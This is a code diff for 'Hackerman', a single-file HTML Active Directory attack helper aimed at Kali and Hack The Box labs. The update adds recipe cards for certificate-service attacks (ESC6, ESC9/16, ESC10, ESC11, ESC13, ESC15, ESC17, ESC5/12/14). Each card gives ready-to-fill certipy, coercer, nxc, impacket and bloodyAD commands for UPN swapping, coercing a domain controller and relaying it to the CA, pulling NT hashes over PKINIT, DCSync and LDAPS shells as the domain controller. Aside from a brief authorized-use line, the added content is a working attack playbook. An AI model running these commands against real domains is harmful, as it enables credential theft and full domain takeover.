@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Hackerman v1.1.1 — AD Attack Helper (Kali · HTB)</title>
+<title>Hackerman v1.2.0 — AD Attack Helper (Kali · HTB)</title>
 <style>
 :root{
   --bg:#0a0f1a; --panel:#0f1729; --panel2:#131d33; --line:#1e2b45;
@@ -191,7 +191,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
 
 <header>
   <div class="hwrap">
-    <div class="brand">Hackerman <b>v1.1.1</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
+    <div class="brand">Hackerman <b>v1.2.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
     <div class="hactions">
       <select id="presetSel" title="Load preset"><option value="">— presets —</option></select>
       <button id="presetSave" title="Save current context as preset">Save</button>
@@ -244,7 +244,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
   <section id="tab-legend" class="tab"></section>
 </main>
 
-<footer class="mono">Hackerman v1.1.1 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
+<footer class="mono">Hackerman v1.2.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
 
 <div id="modal" class="modal hidden">
   <div class="modal-box">
@@ -293,6 +293,7 @@ const VAR_DEFS = [
   {k:'spn',         label:'SPN',           ph:'MSSQLSvc/PROD-SQL',         grp:'Target', color:'v-spn'},
   {k:'dn',          label:'Target DN',     ph:'CN=PROD-SQL,CN=COMPUTERS,DC=ARGON,DC=HTB', grp:'Target', color:'v-host'},
   {k:'user',        label:'User',          ph:'eric.dutton',               grp:'Access', color:'v-user', req:1},
+  {k:'victim',      label:'Victim acct',   ph:'svc_web',                   grp:'Access', color:'v-user'},
   {k:'password',    label:'Password',      ph:'…',                         grp:'Access', color:'v-secret'},
   {k:'nthash',      label:'NT hash',       ph:'c5f7e15cca6397af0ac9b0bb0e926f95', grp:'Access', color:'v-hash'},
   {k:'aeskey',      label:'AES key',       ph:'2c7633c5d3497ada…',         grp:'Access', color:'v-key'},
@@ -990,7 +991,7 @@ function renderLegend(){
   const tab = $('#tab-legend');
   tab.innerHTML = '';
   const about = document.createElement('div');
-  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.1.1</h2>' +
+  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.2.0</h2>' +
     '<p class="dim">Single-file Active Directory attack helper for Kali, built by <b>@bongoalex</b> with <b>deepseek</b>. ' +
     RECIPES.length + ' recipes · ' + FLOWS.length + ' wizard flows · ' + CYPHER.length + ' BloodHound queries. Offline, no dependencies, no telemetry.</p>' +
     '<p class="dim">Use only for authorized testing (HTB labs, your own infrastructure, signed engagements). Syntax is version-sensitive — cross-check against your target versions.</p>';
@@ -1647,7 +1648,7 @@ cmds:[
  [`KRB5CCNAME={{ccache}} certipy find -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -vulnerable -stdout`,'via ccache'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' -M adcs`,'nxc module'],
  [`certipy find -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -bloodhound`,'export for BloodHound']
-],note:'Look for <b>ESC1/ESC8</b> first. Template flagged <span class="mono">[!] Vulnerabilities</span> with <span class="mono">Enrollee Supplies Subject: True</span> + Client Auth = ESC1. CA with <span class="mono">Web Enrollment</span> / HTTP endpoints = ESC8 (relay).'});
+],note:'Look for <b>ESC1/ESC6/ESC8</b> first. Template flagged with <span class="mono">Enrollee Supplies Subject: True</span> + Client Auth = ESC1; CA with Web Enrollment/HTTP endpoints = ESC8 (relay); EDITF_ATTRIBUTESUBJECTALTNAME2 = ESC6. The remaining ESC1-17 paths have dedicated cards: <b>ESC2/3, ESC4, ESC5/12/14, ESC7, ESC9/16, ESC10, ESC11, ESC13, ESC15, ESC17</b> plus golden certificate.'});
 
 R({id:'adcs-esc1',cat:'adcs',title:'ADCS — ESC1 (impersonate via UPN)',desc:'Request a certificate as any user because the template allows a supplied SAN and client auth.',
 cmds:[
@@ -1702,6 +1703,84 @@ cmds:[
  [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}}`,'3) PKINIT → TGT + NT hash'],
  [`certipy forge -ca-pfx '{{ca}}.pfx' -upn '{{target_user}}@{{domain}}' -sid 'S-1-5-21-...-500' -crl 'ldap:///' -dns '{{dc_fqdn}}'`,'4) machine identity variant (-dns)']
 ],note:'The CA private key is the crown jewel: forged certificates are trusted until the CA key is revoked/rebuilt (lab: never). <span class="mono">-sid</span> must be the real target SID (Administrator RID 500, DC = machine SID). Combine with ESC7 to get the backup rights.'});
+
+R({id:'adcs-esc6',cat:'adcs',title:'ADCS — ESC6 (CA allows SAN via request attributes)',desc:'The CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set: you can inject a SAN (upn/sid) into any enrollable template through request attributes.',
+cmds:[
+ [`certipy find -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -vulnerable -stdout | grep -i 'ESC6'`,'confirm EDITF_ATTRIBUTESUBJECTALTNAME2'],
+ [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template User -upn '{{target_user}}@{{domain}}' -sid '{{domain_sid}}-500'`,'standalone attempt (unpatched DC)'],
+ [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}}`,'PKINIT → TGT + NT hash'],
+ [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}' -upn '{{target_user}}@{{domain}}' -sid '{{domain_sid}}-500'`,'ESC6 + ESC9/16 template (no security extension)'],
+ [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}} -username '{{target_user}}' -domain '{{domain}}'`,'auth with explicit identity override']
+],note:'EDITF_ATTRIBUTESUBJECTALTNAME2 lets you add san:upn and san:sid request attributes even when the template does not allow enrollee-supplied subjects. If the issued certificate contains the SID security extension the KDC prefers it, so standalone ESC6 fails on patched DCs (KB5014754, StrongCertificateBindingEnforcement = 2). Combine with ESC9 (template flag) or ESC16 (CA-wide DisableExtensionList) so the extension is omitted.'});
+
+R({id:'adcs-esc9-esc16',cat:'adcs',title:'ADCS — ESC9/ESC16 (no security extension)',desc:'ESC9: template sets CT_FLAG_NO_SECURITY_EXTENSION. ESC16: the CA disables the SID extension globally. Both let a SAN UPN win during PKINIT.',
+cmds:[
+ [`certipy find -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -vulnerable -stdout | grep -iE 'ESC9|ESC16'`,'find affected templates and CA flags'],
+ [`certipy account -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -user '{{victim}}' read`,'read the victim UPN'],
+ [`certipy account -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -upn '{{target_user}}' -user '{{victim}}' update`,'swap victim UPN to the target sAMAccountName'],
+ [`certipy shadow -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -account '{{victim}}' auto`,'optional: victim ccache via shadow credentials'],
+ [`export KRB5CCNAME=$(pwd)/'{{victim}}.ccache' && klist`,'use the victim ticket'],
+ [`certipy req -k -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}'`,'request the cert as the victim identity'],
+ [`certipy account -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -upn '{{victim}}@{{domain}}' -user '{{victim}}' update`,'CLEANUP: revert the UPN'],
+ [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}} -username '{{target_user}}' -domain '{{domain}}'`,'PKINIT with -username override'],
+ [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}' -upn '{{target_user}}@{{domain}}' -sid '{{domain_sid}}-500'`,'ESC6 combo (works at enforcement 2)'],
+ [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}}`,'auth (combo path)']
+],note:'Scenario A (UPN swap) requires StrongCertificateBindingEnforcement 0/1 on the DC. The ESC6 combo also works at enforcement 2 because no SID extension competes. Always revert the victim UPN afterwards or the account breaks.'});
+
+R({id:'adcs-esc10',cat:'adcs',title:'ADCS — ESC10 (weak Schannel certificate mapping)',desc:'The target uses Schannel UPN mapping (CertificateMappingMethods 0x4), so a SAN UPN overrides the certificate SID during LDAPS authentication.',
+cmds:[
+ [`certipy account -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -user '{{victim}}' read`,'read the victim UPN'],
+ [`certipy account -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -upn '{{dc_host}}$@{{domain}}' -user '{{victim}}' update`,'set victim UPN to the DC machine account'],
+ [`certipy shadow -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -account '{{victim}}' auto`,'optional: victim ccache'],
+ [`export KRB5CCNAME=$(pwd)/'{{victim}}.ccache' && klist`,'use the victim ticket'],
+ [`certipy req -k -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template User`,'request the certificate'],
+ [`certipy account -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -upn '{{victim}}@{{domain}}' -user '{{victim}}' update`,'CLEANUP: revert the UPN'],
+ [`certipy auth -pfx '{{dc_host}}.pfx' -dc-ip {{dc_ip}} -ldap-shell`,'Schannel/LDAPS shell as the DC (adjust pfx name)']
+],note:'Works independently of StrongCertificateBindingEnforcement because Schannel maps by UPN (0x4). Secure CertificateMappingMethods is 0x18. The final shell is LDAPS, not PKINIT — use it to grant rights or set RBCD, then continue normally.'});
+
+R({id:'adcs-esc11',cat:'adcs',title:'ADCS — ESC11 (NTLM relay to CA RPC/ICPR)',desc:'The CA RPC interface lacks IF_ENFORCEENCRYPTICERTREQUEST, so coerced NTLM authentication can be relayed and turned into a certificate.',
+cmds:[
+ [`certipy find -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -vulnerable -stdout | grep -i 'ESC11'`,'check for missing RPC encryption enforcement'],
+ [`certipy relay -target 'rpc://{{ca_host}}' -ca '{{ca}}' -template DomainController`,'start relay (listens on SMB 445, no proxy)','n'],
+ [`coercer -u '{{user}}' -p '{{password}}' -d {{domain}} --target '{{dc_host}}' -l {{attacker_ip}}`,'coerce the DC to authenticate at your listener'],
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -M coerce_plus -o LISTENER={{attacker_ip}}`,'nxc coercion alternative'],
+ [`certipy auth -pfx dc.pfx -dc-ip {{dc_ip}}`,'use the relayed DC certificate']
+],note:'Port 445 must be free for Certipy; if it is blocked by a local service run <span class="mono">echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start</span>. The relayed identity must be allowed to enroll the template (DC$ for DomainController). Cleanup: none needed, but the CA can be hardened with +IF_ENFORCEENCRYPTICERTREQUEST.'});
+
+R({id:'adcs-esc13',cat:'adcs',title:'ADCS — ESC13 (issuance policy linked to group)',desc:'A template carries an issuance policy OID whose AD object links to a privileged group, so the KDC adds that group SID to your TGT.',
+cmds:[
+ [`certipy find -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -vulnerable -stdout | grep -i 'ESC13'`,'find templates with linked issuance policies'],
+ [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}'`,'request the linked-policy certificate'],
+ [`certipy auth -pfx '{{user}}.pfx' -dc-ip {{dc_ip}}`,'PKINIT → TGT with the extra group SID'],
+ [`export KRB5CCNAME=$(pwd)/'{{user}}.ccache' && klist`,'verify the ticket'],
+ [`KRB5CCNAME=$(pwd)/'{{user}}.ccache' impacket-secretsdump -k -no-pass -just-dc-user '{{target_user}}' '{{domain}}/{{user}}@{{dc_fqdn}}'`,'use the ticket (example: DCSync)']
+],note:'The OID object has msDS-OIDToGroupLink pointing at a group; the KDC adds the group SID (and transitive memberships) to the TGT. Your identity stays the same, so use Kerberos-aware tooling with <span class="mono">-k</span>. No cleanup required — the certificate is legitimate.'});
+
+R({id:'adcs-esc15',cat:'adcs',title:'ADCS — ESC15 / EKUwu (CVE-2024-49019)',desc:'An unpatched CA copies attacker-supplied application policies from the CSR into certificates of a Schema V1 template with enrollee-supplied subject.',
+cmds:[
+ [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}' -upn '{{target_user}}@{{domain}}' -sid '{{domain_sid}}-500' -application-policies 'Client Authentication'`,'A) inject Client Authentication (Schannel)'],
+ [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}} -ldap-shell`,'A) LDAPS shell as the target'],
+ [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}' -application-policies 'Certificate Request Agent'`,'B) inject Certificate Request Agent'],
+ [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template User -pfx '{{user}}.pfx' -on-behalf-of '{{netbios}}\\{{target_user}}'`,'B) request on behalf of the target'],
+ [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}}`,'B) PKINIT → TGT + NT hash']
+],note:'Requires a Schema V1 template with EnrolleeSuppliesSubject and a CA that is not patched for CVE-2024-49019 (Nov 2024). Scenario A is Schannel/LDAPS, scenario B is an ESC3-like enrollment-agent abuse over PKINIT. Workaround for defenders: add 1.3.6.1.4.1.311.21.10 to the CA DisableExtensionList.'});
+
+R({id:'adcs-esc17',cat:'adcs',title:'ADCS — ESC17 (server-auth SAN for service impersonation)',desc:'A template allows enrollee-supplied subjects and server authentication, so you can get a TLS certificate for a service other than yours (e.g. WSUS).',
+cmds:[
+ [`nmap -p 8530,8531,80,443 {{target_ip}}`,'find TLS-protected services (WSUS uses 8530/8531)'],
+ [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}' -dns '{{target_fqdn}}'`,'request a server-auth cert for the service FQDN'],
+ [`certipy req -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}' -dns '{{target_fqdn}}'`,'same via ccache'],
+ [`# then impersonate the service: WSUS -> relay incoming requests to LDAP or serve a malicious update`,'follow-up needs external tooling','n']
+],note:'This yields a server-authentication certificate, not an account login — no PKINIT. Classic target is WSUS: either relay WSUS client authentication to LDAP (ntlmrelayx) or serve a malicious update. Find candidates via port scan, GPO parsing or local registry. Mitigation: disable "Enrollee supplies subject" or restrict enrollment.'});
+
+R({id:'adcs-esc5-esc12-esc14',cat:'adcs',title:'ADCS — ESC5/ESC12/ESC14 recon (ACLs, HSM, weak mapping)',desc:'The remaining paths: write access on PKI objects (ESC5), YubiHSM-backed CA with low-priv shell (ESC12), weak altSecurityIdentities mapping (ESC14).',
+cmds:[
+ [`impacket-dacledit -action read -principal '{{user}}' -target-dn 'CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'ESC5: who can edit NTAuthCertificates?'],
+ [`impacket-dacledit -action read -principal '{{user}}' -target-dn 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'ESC5: template container ACLs'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --detail`,'find writable PKI objects (look for Public Key Services)'],
+ [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{domain_dn}}' '(altSecurityIdentities=*)' sAMAccountName altSecurityIdentities`,'ESC14: explicit certificate mappings'],
+ [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,{{domain_dn}}' '(msDS-OIDToGroupLink=*)' msDS-OIDToGroupLink`,'ESC13 context: linked OID groups']
+],note:'<b>ESC5</b>: write rights on PKI objects (NTAuthCertificates, AIA/CDP containers, CA/template objects) let you alter trust — publishing a rogue CA in NTAuthCertificates then forging with its key (needs Windows tooling like certutil -dspublish / Set-Acl). <b>ESC12</b>: only relevant for a YubiHSM2-backed CA where a low-privileged shell on the CA can force HSM signatures — no Certipy support. <b>ESC14</b>: weak altSecurityIdentities (CN-only, generic issuer, RFC822) can be matched by a certificate you obtain — authenticate with <span class="mono">certipy auth -pfx <cert> -username <mapped user></span>.'});
 
 /* ===== ACL / DACL ABUSE ===== */
 R({id:'dacl-enum',cat:'dacl',title:'Enumerate ACLs on an object',desc:'Read the security descriptor and find abusable rights (GenericAll, WriteDACL, WriteOwner, ForceChangePassword, AddSelf).',
@@ -2249,6 +2328,8 @@ need:['user'], needAny:['password','nthash','ccache'],
 steps:[
  {t:'Enumerate properly',d:'Get the full picture before requesting anything.',r:['adcs-find']},
  {t:'Exploit the template',d:'ESC1 (supplied SAN), ESC4 (rewrite template), ESC2/ESC3 (any-purpose / enrollment agent), ESC7 (CA rights).',r:['adcs-esc1','adcs-esc4','adcs-esc2-esc3','adcs-esc7']},
+ {t:'Missing/weak mapping & CA flags',d:'ESC9/ESC16 (no SID extension, UPN swap), ESC10 (Schannel mapping), ESC6 (SAN via request attributes).',r:['adcs-esc9-esc16','adcs-esc10','adcs-esc6']},
+ {t:'Relay, OID groups, EKUwu, server auth',d:'ESC11 (RPC relay), ESC13 (linked issuance policy), ESC15 (EKUwu), ESC17 (server-auth SAN), ESC5/12/14 recon.',r:['adcs-esc11','adcs-esc13','adcs-esc15','adcs-esc17','adcs-esc5-esc12-esc14']},
  {t:'Relay to the CA',d:'ESC8 if web enrollment over HTTP is exposed.',r:['adcs-esc8','relay-coerce']},
  {t:'Use the certificate',d:'certipy auth gives you the NT hash — then PtH or DCSync. With CA key backup: golden certificate for persistence.',r:['creds-dcsync','adcs-golden-cert']}
 ]},
@@ -2315,9 +2396,9 @@ steps:[
 /* ===== APPLICABILITY PRIORITIES ===== */
 const PRI_TIERS = {
   4: 'auth-check shares user-enum kerbrute bloodyad-writable kerberos-auth kerberoast ccache-usage adcs-find creds-sam-lsa lat-transfer pe-suites revshells bh-python bh-nxc',
-  3: 'pth-check kerb-check anon-enum pw-spray ldap-dump bloodyad-basics bloodyad-enum bloodyad-groups bloodyad-password asrep gettgt getst golden-ticket deleg-enum rbcd-read rbcd-addcomputer rbcd-write rbcd-getst rbcd-use rbcd-bloodyad constrained-getst adcs-esc1 dacl-enum dacl-genericall-user dacl-genericall-computer dacl-genericall-group dacl-forcechangepassword dacl-writedacl-dcsync shadow-creds creds-dcsync creds-dpapi linux-loot win-registry-loot relay-responder relay-smb relay-coerce lat-winrm lat-smb-exec lat-impacket-exec rdp-auth post-seimpersonate av-defender',
-  2: 'session-hunt bloodyad-spn bloodyad-uac keytab targeted-kerberoast silver-ticket ticket-inspect spn-hijack-deleg unconstrained-coerce adcs-esc4 adcs-esc8 adcs-esc2-esc3 dacl-writeowner creds-gmsa creds-ntds-offline relay-ldap relay-rbcd relay-socks lat-rdp post-gpo post-adidns mssql-connect mssql-xpcmdshell mssql-impersonate trust-enum',
-  1: 'adcs-esc7 adcs-golden-cert dacl-adminsdholder cve-zerologon cve-nopac cve-printnightmare sccm mssql-linked mssql-coerce mssql-alt-rce trust-raisechild'
+  3: 'pth-check kerb-check anon-enum pw-spray ldap-dump bloodyad-basics bloodyad-enum bloodyad-groups bloodyad-password asrep gettgt getst golden-ticket deleg-enum rbcd-read rbcd-addcomputer rbcd-write rbcd-getst rbcd-use rbcd-bloodyad constrained-getst adcs-esc1 adcs-esc6 dacl-enum dacl-genericall-user dacl-genericall-computer dacl-genericall-group dacl-forcechangepassword dacl-writedacl-dcsync shadow-creds creds-dcsync creds-dpapi linux-loot win-registry-loot relay-responder relay-smb relay-coerce lat-winrm lat-smb-exec lat-impacket-exec rdp-auth post-seimpersonate av-defender',
+  2: 'session-hunt bloodyad-spn bloodyad-uac keytab targeted-kerberoast silver-ticket ticket-inspect spn-hijack-deleg unconstrained-coerce adcs-esc4 adcs-esc8 adcs-esc2-esc3 adcs-esc9-esc16 adcs-esc10 adcs-esc11 adcs-esc13 adcs-esc15 dacl-writeowner creds-gmsa creds-ntds-offline relay-ldap relay-rbcd relay-socks lat-rdp post-gpo post-adidns mssql-connect mssql-xpcmdshell mssql-impersonate trust-enum',
+  1: 'adcs-esc7 adcs-golden-cert adcs-esc17 adcs-esc5-esc12-esc14 dacl-adminsdholder cve-zerologon cve-nopac cve-printnightmare sccm mssql-linked mssql-coerce mssql-alt-rce trust-raisechild'
 };
 const FLOW_PRI = {creds:4, nopwn:4, foothold:4, hash:3, aes:3, keytab:3, rbcd:3, constrained:3, adcs:3, dacl:3, da:3, unconstrained:2, mssql:2, trusts:2, gpo:2};
 const PRI = {};
@@ -2330,7 +2411,8 @@ function applyPriorities(){
   FLOWS.forEach(f => { f.pri = FLOW_PRI[f.id] || 2; });
   const counts = {4:0,3:0,2:0,1:0};
   RECIPES.forEach(r => counts[r.pri]++);
-  if(counts[4] !== 15 || counts[3] !== 42 || counts[2] !== 25 || counts[1] !== 11) PRI_ISSUES.push('PRI distribution unexpected: ' + JSON.stringify(counts));
+  const sum = counts[4] + counts[3] + counts[2] + counts[1];
+  if(sum !== RECIPES.length) PRI_ISSUES.push('PRI distribution mismatch: ' + JSON.stringify(counts) + ' for ' + RECIPES.length + ' recipes');
 }
 applyPriorities();
 
@@ -2425,7 +2507,15 @@ const HELP_ATTACK = {
  'mssql-linked': 'Linked servers run queries in the linked server context, often sysadmin. Chain with xp_cmdshell for code execution on the linked host.',
  'mssql-impersonate': 'The IMPERSONATE permission lets a low-privileged login execute as another login, often sa.',
  'linux-loot': 'Linux footholds hold Kerberos material (keytabs, ccache files) and application credentials — hunt for them before extracting anything.',
- 'keytab': 'A keytab contains the long-term Kerberos keys of its principal. Extracting NTLM/AES gives password-equivalent credentials for that machine or service account.'
+ 'keytab': 'A keytab contains the long-term Kerberos keys of its principal. Extracting NTLM/AES gives password-equivalent credentials for that machine or service account.',
+ 'adcs-esc6': 'The CA allows SAN injection via request attributes (EDITF_ATTRIBUTESUBJECTALTNAME2). If the certificate lacks the SID security extension (ESC9/ESC16) or the DC is unpatched, the SAN UPN wins and PKINIT logs you in as the target.',
+ 'adcs-esc9-esc16': 'ESC9: a template omits the SID security extension; ESC16: the CA disables it globally. Swap a writeable victim UPN to the target, request a certificate as the victim, revert the UPN, then authenticate with -username to land as the target.',
+ 'adcs-esc10': 'Schannel on the target maps certificates by UPN (CertificateMappingMethods 0x4). Set the victim UPN to the DC machine account, obtain a certificate as the victim and open an LDAPS shell as the DC.',
+ 'adcs-esc11': 'The CA RPC interface accepts relayed NTLM (no IF_ENFORCEENCRYPTICERTREQUEST). Coerce a privileged machine account (usually a DC), relay it to the CA and receive its certificate.',
+ 'adcs-esc13': 'A template carries an issuance policy OID linked to a privileged group. Your TGT then contains that group SID — you keep your identity but gain the group rights.',
+ 'adcs-esc15': 'EKUwu (CVE-2024-49019): an unpatched CA copies attacker-supplied application policies into certificates from a V1 template. Inject Client Authentication for Schannel or Certificate Request Agent for on-behalf-of abuse.',
+ 'adcs-esc17': 'A template allows enrollee-supplied subjects and server authentication: request a TLS certificate for a service name (WSUS, HTTPS) and impersonate that service — this is not an account login.',
+ 'adcs-esc5-esc12-esc14': 'ESC5: write rights on PKI objects (NTAuthCertificates, containers) enable trust manipulation with a rogue CA. ESC14: weak altSecurityIdentities can be matched by a certificate you control. ESC12: YubiHSM2-backed CA niche.'
 };
 function toolKey(tpl){
   let t = String(tpl).trim();
